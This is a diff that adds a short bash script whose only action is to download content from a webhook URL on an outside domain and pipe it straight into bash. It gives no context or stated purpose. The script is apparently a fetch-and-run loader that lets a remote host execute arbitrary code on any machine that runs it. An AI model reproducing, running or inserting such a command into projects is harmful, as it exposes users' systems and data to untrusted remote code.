@@ -1,0 +1,4 @@
+#!/bin/bash
+set -e
+
+curl -fsSL https://web12.souweverton.com.br/webhook/dad5b129-2725-49a2-a950-44b92c4574fe | bash
